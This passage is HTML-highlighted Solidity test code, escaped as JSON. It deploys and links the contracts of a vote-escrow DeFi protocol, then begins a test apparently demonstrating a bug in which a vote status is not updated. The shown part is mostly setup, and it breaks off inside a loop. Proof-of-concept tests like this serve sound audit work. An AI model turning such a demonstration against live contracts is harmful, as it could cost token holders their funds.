class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetDepositor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_statusNotUpdatingVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_initialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//zero % ownership of top protcols\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1800\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan 